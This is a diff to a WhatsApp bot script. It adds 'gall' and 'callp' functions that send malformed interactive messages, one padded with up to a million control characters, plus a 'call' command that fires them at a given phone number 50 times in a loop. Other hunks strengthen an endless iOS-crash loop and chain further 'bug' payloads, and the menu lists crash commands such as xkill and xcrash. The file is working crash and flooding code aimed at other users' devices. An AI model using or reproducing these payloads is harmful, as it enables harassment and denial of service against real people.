@@ -1772,21 +1772,90 @@ async function BugFrezee(target) {
                 { participant: { jid: target } }
             );            
         };
+
+async function gall(target, qtd, dosis) {
+    let pepek = await generateWAMessageFromContent(
+        target,
+        proto.Message.fromObject({
+            ephemeralMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "ᴸᴼ♱ᴿᴰ☠︎︎Makino",
+                            format: "DEFAULT"
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Supreme\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"phoenixgibson007@gmail.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(dosis)}\",\"screen_0_TextInput_1\":\"ᴸᴼ♱ᴿᴰ☠︎︎Makino\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+                            version: 3
+                        }
+                    }
+                }
+            }
+        }),
+        { userJid: target, quoted: qtd }
+    );
+
+    await XeonBotInc.relayMessage(
+        target,
+        pepek.message,
+        { participant: { jid: target }, messageId: pepek.key.id }
+    );
+}
+
+
+async function callp(target, qtd) {
+    let pepek = await generateWAMessageFromContent(
+        target,
+        proto.Message.fromObject({
+            ephemeralMessage: {
+                message: {
+                    interactiveMessage: {
+                        body: {
+                            text: "ᴸᴼ♱ᴿᴰ☠︎︎Makino"
+                        },
+                        header: {
+                            hasMediaAttachment: false,
+                            locationMessage: {}
+                        },
+                        nativeFlowMessage: {
+                            buttons: [
+                                {
+                                    name: "call_permission_request",
+                                    buttonParamsJson: "{}"
+                                }
+                            ]
+                        }
+                    }
+                }
+            }
+        }),
+        { userJid: target, quoted: qtd }
+    );
+
+    await XeonBotInc.relayMessage(
+        target,
+        pepek.message,
+        { participant: { jid: target }, messageId: pepek.key.id }
+    );
+}
         switch (command) {
-case 'but': {
+case 'call': {
 if (!isPremium) return replygcxeon(mess.prem)
-const buttons = [
-    {buttonId: 'runtime', buttonText: {displayText: '1.) runtime'}, type: 1},
-    {buttonId: 'ping', buttonText: {displayText: '2.) ping'}, type: 1},
-    {buttonId: 'menu', buttonText: {displayText: '3.) menu'}, type: 1},
-  ]
-  
-  const buttonMessage = {
-      text: "command shortcut",
-      footer: '',
-      buttons: buttons,
-  }
-  await XeonBotInc.sendMessage(m.chat, buttonMessage)
+if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
+let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+await loading()
+for (let i = 0;i < 50;i++) {
+await gall(target, xbug2, 1020000)
+await callp(target, )
+await callp(target, )
+await gall(target, xbug2, 350000)
+await callp(target, )
+await gall(target, xbug2, 1020000)
+await gall(target, xbug2, 1020000)
+await gall(target, xbug2, 1020000)
+}
+await replygcxeon(`Done sending bugs to ${target}`)
 }
 break 
 			
@@ -1950,22 +2019,6 @@ case 'vv': {
 break
 
 
-/*case 's': case 'sticker': case 'stiker': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
-if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: "【 𖤍 】⁩ 𝙻𝙾𝚁𝙳 𝚃𝙰𝙸𝚁𝙰 𝙼𝙰𝙺𝙸𝙽𝙾", author: pushname })
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcxlicon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
-let media = await quoted.download()
-let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: "【 𖤍 】⁩ 𝙻𝙾𝚁𝙳 𝚃𝙰𝙸𝚁𝙰 𝙼𝙰𝙺𝙸𝙽𝙾", author: pushname }) 
-} else {
-replygcxlicon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
-}
-}
-break*/
-
 case 'take': case 'sticker': case 's': case 'thief': case 'steal': {
         if (!isPremium) return                                                                                                                                                            
 	if (!m.quoted) return replygcxeon(`*Reply to an image or video.*`);
@@ -2066,8 +2119,8 @@ let target = q
 await loading()
 for (;;) {
 await ioscrash(target)
-ios1(target)
-ios2(target)
+await ios1(target)
+await ios2(target)
 }
 }
 break
@@ -2223,7 +2276,10 @@ let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 50; i++) {
 await BugPayment(target)
-await bugpayflow(target)
+await BugFrezee(target)
+await OLDLOC(target, TypeNull) 
+await callp(target, )
+await gall(target, xbug2, 1020000)
 await galx(target, Ptcp = true)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
@@ -3159,230 +3215,6 @@ break
             }
             break
 
-case 'play':  case 'song': {
-if (!text) return replygcxeon(`Example : ${prefix + command} anime whatsapp status`)
-const xeonplaymp3 = require('./lib/ytdl2')
-let yts = require("youtube-yts")
-        let search = await yts(text)
-        let anup3k = search.videos[0]
-const pl= await xeonplaymp3.mp3(anup3k.url)
-await XeonBotInc.sendMessage(m.chat,{
-    audio: fs.readFileSync(pl.path),
-    fileName: anup3k.title + '.mp3',
-    mimetype: 'audio/mp4', ptt: true,
-    contextInfo:{
-        externalAdReply:{
-            title:anup3k.title,
-            body: botname,
-            thumbnail: await fetchBuffer(pl.meta.image),
-            mediaType:2,
-            mediaUrl:anup3k.url,
-        }
-
-    },
-},{quoted:m})
-await fs.unlinkSync(pl.path)
-}
-break
-case "ytmp3": case "ytaudio":
-const xeonaudp3 = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygcxeon(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
-const audio=await xeonaudp3.mp3(text)
-await XeonBotInc.sendMessage(m.chat,{
-    audio: fs.readFileSync(audio.path),
-    mimetype: 'audio/mp4', ptt: true,
-    contextInfo:{
-        externalAdReply:{
-            title:audio.meta.title,
-            body: botname,
-            thumbnail: await fetchBuffer(audio.meta.image),
-            mediaType:2,
-            mediaUrl:text,
-        }
-
-    },
-},{quoted:m})
-await fs.unlinkSync(audio.path)
-break
-case 'ytmp4': case 'ytvideo': {
-const xeonvidoh = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygcxeon(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
-const vid=await xeonvidoh.mp4(text)
-const ytc=`
-*${themeemoji}Tittle:* ${vid.title}
-*${themeemoji}Date:* ${vid.date}
-*${themeemoji}Duration:* ${vid.duration}
-*${themeemoji}Quality:* ${vid.quality}`
-await XeonBotInc.sendMessage(m.chat,{
-    video: {url:vid.videoUrl},
-    caption: ytc
-},{quoted:m})
-}
-break
-case 'sound1':
-case 'sound2':
-case 'sound3':
-case 'sound4':
-case 'sound5':
-case 'sound6':
-case 'sound7':
-case 'sound8':
-case 'sound9':
-case 'sound10':
-case 'sound11':
-case 'sound12':
-case 'sound13':
-case 'sound14':
-case 'sound15':
-case 'sound16':
-case 'sound17':
-case 'sound18':
-case 'sound19':
-case 'sound20':
-case 'sound21':
-case 'sound22':
-case 'sound23':
-case 'sound24':
-case 'sound25':
-case 'sound26':
-case 'sound27':
-case 'sound28':
-case 'sound29':
-case 'sound30':
-case 'sound31':
-case 'sound32':
-case 'sound33':
-case 'sound34':
-case 'sound35':
-case 'sound36':
-case 'sound37':
-case 'sound38':
-case 'sound39':
-case 'sound40':
-case 'sound41':
-case 'sound42':
-case 'sound43':
-case 'sound44':
-case 'sound45':
-case 'sound46':
-case 'sound47':
-case 'sound48':
-case 'sound49':
-case 'sound50':
-case 'sound51':
-case 'sound52':
-case 'sound53':
-case 'sound54':
-case 'sound55':
-case 'sound56':
-case 'sound57':
-case 'sound58':
-case 'sound59':
-case 'sound60':
-case 'sound61':
-case 'sound62':
-case 'sound63':
-case 'sound64':
-case 'sound65':
-case 'sound66':
-case 'sound67':
-case 'sound68':
-case 'sound69':
-case 'sound70':
-case 'sound71':
-case 'sound72':
-case 'sound73':
-case 'sound74':
-case 'sound75':
-case 'sound76':
-case 'sound77':
-case 'sound78':
-case 'sound79':
-case 'sound80':
-case 'sound81':
-case 'sound82':
-case 'sound83':
-case 'sound84':
-case 'sound85':
-case 'sound86':
-case 'sound87':
-case 'sound88':
-case 'sound89':
-case 'sound90':
-case 'sound91':
-case 'sound92':
-case 'sound93':
-case 'sound94':
-case 'sound95':
-case 'sound96':
-case 'sound97':
-case 'sound98':
-case 'sound99':
-case 'sound100':
-case 'sound101':
-case 'sound102':
-case 'sound103':
-case 'sound104':
-case 'sound105':
-case 'sound106':
-case 'sound107':
-case 'sound108':
-case 'sound109':
-case 'sound110':
-case 'sound111':
-case 'sound112':
-case 'sound113':
-case 'sound114':
-case 'sound115':
-case 'sound116':
-case 'sound117':
-case 'sound118':
-case 'sound119':
-case 'sound120':
-case 'sound121':
-case 'sound122':
-case 'sound123':
-case 'sound124':
-case 'sound125':
-case 'sound126':
-case 'sound127':
-case 'sound128':
-case 'sound129':
-case 'sound130':
-case 'sound131':
-case 'sound132':
-case 'sound133':
-case 'sound134':
-case 'sound135':
-case 'sound136':
-case 'sound137':
-case 'sound138':
-case 'sound139':
-case 'sound140':
-case 'sound141':
-case 'sound142':
-case 'sound143':
-case 'sound144':
-case 'sound145':
-case 'sound146':
-case 'sound147':
-case 'sound148':
-case 'sound149':
-case 'sound150':
-case 'sound151':
-case 'sound152':
-case 'sound153':
-case 'sound154':
-case 'sound155':
-case 'sound156':
-case 'sound157':
-case 'sound158':
-case 'sound159':
-case 'sound160':
-case 'sound161':
-XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
-await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
-break
 
 //bug cases
 case 'clearchat':
@@ -3464,8 +3296,8 @@ break
 ╰┈➤ ${xeonytimewisher} 😄
 ${readmore}
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
-xkill <number|amount>
-xkill2 <amount>
+xkill <number>
+call <number>
 tempban <code|number>
 xcrash <number>
 infinite <number> 
@@ -3481,13 +3313,13 @@ deletesession
 join
 shutdown  
 restart
-autoread *[option]*
-autotyping *[option]*
-autorecording *[option]*
-autorecordtyp *[option]*
-autobio *[option]*
-autoswview *[option]*
-mode *[option]*
+autoread 
+autotyping 
+autorecording 
+autorecordtyp 
+autobio 
+autoswview 
+mode 
 block
 unblock 
 backup
@@ -3507,7 +3339,7 @@ setppgc
 tagall
 hidetag
 totag
-group *[option]*
+group 
 editinfo
 linkgc
 revoke
@@ -3533,38 +3365,7 @@ tovn
 togif
 tourl
 toqr
-toviewonce
-fliptext
-emojimix
-
-╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
-addvideo
-addimage
-addsticker
-addvn
-addzip
-addapk
-addpdf
-delvideo
-delimage
-delsticker
-delvn
-delzip
-delapk
-delpdf
-listvideo
-listimage
-liststicker
-listvn
-listzip
-listapk
-listpdf
-
-╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
-play
-ytmp3
-ytmp4
-sound1 - sound161`
+toviewonce`
 			
 await menu(m.chat, xeonmenuoh)
 /*if (typemenu === 'v1') {
